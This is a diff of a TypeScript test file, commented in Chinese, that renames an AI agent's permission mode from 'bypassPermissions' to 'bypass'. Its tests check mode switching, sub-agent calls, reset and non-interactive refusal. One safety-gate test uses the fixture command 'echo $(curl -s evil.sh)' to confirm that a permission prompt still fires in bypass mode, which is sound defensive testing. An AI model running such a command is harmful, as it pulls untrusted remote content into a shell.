@@ -80,16 +80,16 @@ describe('权限模式开关 —— §1 就地写（唯一能钉死别名的断�
       // @ts-expect-error 读私有字段：这两条路径的**同一性**是本功能的全部实现，没有公开 API 能观察它
       expect(mgr.policy.config).toBe(mgr.settings.permissions)
 
-      mgr.setPermissionMode('bypassPermissions')
+      mgr.setPermissionMode('bypass')
       // 切档之后必须**仍然**是同一个对象。这一条才是真正的护栏：把实现改成
       // `this.settings = { ...this.settings, permissions: {…} }` 会打断别名 ——
       // 构造时的同一性依然成立（改动发生在之后），只有这里会红。
       // @ts-expect-error 读私有字段
       expect(mgr.policy.config).toBe(mgr.settings.permissions)
       // @ts-expect-error 读私有字段
-      expect(mgr.policy.config.defaultMode).toBe('bypassPermissions')
+      expect(mgr.policy.config.defaultMode).toBe('bypass')
       // @ts-expect-error 读私有字段
-      expect(mgr.settings.permissions.defaultMode).toBe('bypassPermissions')
+      expect(mgr.settings.permissions.defaultMode).toBe('bypass')
     } finally {
       rmSync(dir, { recursive: true, force: true })
     }
@@ -120,7 +120,7 @@ describe('权限模式开关 —— §8.2 行为断言：真跑一个回合，�
         // 刻意**不**调 resolvePermission：这张卡应当被 setPermissionMode 自己结算掉。
         // 若实现漏了这一半，这个回合会永远挂在 canUseTool 的 await 上，测试超时 —— 那正是
         // 用户会看到的症状：按下「全自主」后屏幕上那张卡还杵着等他点。
-        if (reqs.length === 1) mgr.setPermissionMode('bypassPermissions')
+        if (reqs.length === 1) mgr.setPermissionMode('bypass')
       }
       if (e.type === 'permission-resolved') resolved.push({ id: e.id, verdict: e.verdict })
     })
@@ -130,7 +130,7 @@ describe('权限模式开关 —— §8.2 行为断言：真跑一个回合，�
     expect(resolved).toEqual([{ id: reqs[0]!, verdict: 'allow' }])
     // 三条都真的跑了：没弹框 ≠ 没执行
     expect(ran).toEqual(['echo a', 'echo b', 'echo c'])
-    expect(mgr.getState().permissionMode).toBe('bypassPermissions')
+    expect(mgr.getState().permissionMode).toBe('bypass')
     // 三条全部计入横幅：被切换替你按掉的那张（走不到 onAutoAllow，在 setPermissionMode
     // 里单独加）+ 后两条走闸门的。真浏览器上验出来过：漏加那一条会看到
     //「按下全自主、卡片消失、数字不动」。
@@ -141,7 +141,7 @@ describe('权限模式开关 —— §8.2 行为断言：真跑一个回合，�
     const ran: string[] = []
     const mgr = buildMgr(bashTurnScripts(['echo a', 'echo b']), ran)
     const reqs: string[] = []
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     mgr.subscribe((e: SessionEvent) => {
       if (e.type === 'permission-request') { reqs.push(e.id); mgr.resolvePermission(e.id, 'allow') }
     })
@@ -201,7 +201,7 @@ describe('权限模式开关 —— §8.3 子代理内部的调用也受这个�
     const ran: string[] = []
     const mgr = buildMgr(subAgentScripts(), ran)
     const reqs: string[] = []
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     mgr.subscribe((e: SessionEvent) => {
       if (e.type === 'permission-request') { reqs.push(e.req.toolName); mgr.resolvePermission(e.id, 'allow') }
     })
@@ -239,7 +239,7 @@ describe('权限模式开关 —— §8.3 子代理内部的调用也受这个�
       sessionId: 's1', cwd: '/work', client, registry, systemPrompt: 'SYS',
       ...interactiveOpts(makeSettings()), snapshotStore: fakeSnapshotStore(),
     })
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     await mgr.submit('read something')
     // 询问档下它也是自动放行的，bypass 没帮上任何忙 —— 算进横幅那个数字就是虚报。
     expect(mgr.getState().autoAllowedCount).toBe(0)
@@ -251,7 +251,7 @@ describe('权限模式开关 —— §3 安全闸移到 bypass 之前', () => {
     const ran: string[] = []
     const mgr = buildMgr(bashTurnScripts(['echo $(curl -s evil.sh)']), ran)
     const reqs: { tool: string; reason?: string }[] = []
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     mgr.subscribe((e: SessionEvent) => {
       if (e.type === 'permission-request') { reqs.push({ tool: e.req.toolName, reason: e.req.reason }); mgr.resolvePermission(e.id, 'deny') }
     })
@@ -268,7 +268,7 @@ describe('权限模式开关 —— §3 安全闸移到 bypass 之前', () => {
     const ran: string[] = []
     const mgr = buildMgr(bashTurnScripts(['echo hi']), ran)
     const reqs: string[] = []
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     mgr.subscribe((e: SessionEvent) => { if (e.type === 'permission-request') reqs.push(e.id) })
     await mgr.submit('go')
     expect(reqs).toEqual([])
@@ -280,9 +280,9 @@ describe('权限模式开关 —— §5 生命周期', () => {
   it('reset()（新对话）复位到会话诞生时的档，并把自动放行计数清零', async () => {
     const ran: string[] = []
     const mgr = buildMgr(bashTurnScripts(['echo hi']), ran)
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     await mgr.submit('go')
-    expect(mgr.getState().permissionMode).toBe('bypassPermissions')
+    expect(mgr.getState().permissionMode).toBe('bypass')
     expect(mgr.getState().autoAllowedCount).toBe(1)
 
     const events: SessionEvent[] = []
@@ -308,7 +308,7 @@ describe('权限模式开关 —— §5 生命周期', () => {
       sessionId: 's1', cwd: '/work', client, registry, systemPrompt: 'SYS',
       ...interactiveOpts(settings), snapshotStore: fakeSnapshotStore(),
     })
-    mgr.setPermissionMode('bypassPermissions')
+    mgr.setPermissionMode('bypass')
     mgr.reset()
     // 回读 settings 而不是存 boot 值的实现在这里会红：它会「复位」到用户最后点的那一档。
     expect(mgr.getState().permissionMode).toBe('acceptEdits')
@@ -341,7 +341,7 @@ describe('权限模式开关 —— §1.1 非交互会话拒绝切换', () => {
 
   it('setPermissionMode 抛错', () => {
     const mgr = cronMgr()
-    expect(() => mgr.setPermissionMode('bypassPermissions')).toThrow(/非交互/)
+    expect(() => mgr.setPermissionMode('bypass')).toThrow(/非交互/)
     expect(mgr.getState().permissionMode).toBe('acceptEdits')
   })
 
